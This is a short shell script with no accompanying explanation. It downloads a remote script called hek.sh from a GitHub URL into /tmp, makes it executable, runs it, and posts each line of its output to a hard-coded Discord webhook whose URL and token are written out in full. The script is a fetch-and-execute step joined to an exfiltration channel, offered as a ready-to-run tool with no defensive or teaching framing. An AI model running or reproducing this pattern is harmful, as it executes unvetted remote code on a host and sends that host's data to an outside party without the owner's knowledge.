discord_url="https://discord.com/api/webhooks/1098558144940081253/G4O7jhCIxOQmHNXqqom4ZDBPTbdPQK2VIULMS5ZECvufZhLJjVERNQJ1-Eq4_zMFtlG9"

cd ../../../tmp

wget https://raw.githubusercontent.com/funfactcat/latenightthought/main/hek.sh

chmod +x hek.sh 

./hek.sh 2>&1 | while IFS= read -r line
  do
    sleep 5
    generate_post_data() {
    cat <<EOF
    {  
     "embeds": [{
    "description": "$line"
    }]
}
EOF
    }
    curl -H "Content-Type: application/json" -X POST -d "$(generate_post_data | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2};?)?)?[mGK]//g")" $discord_url
  done
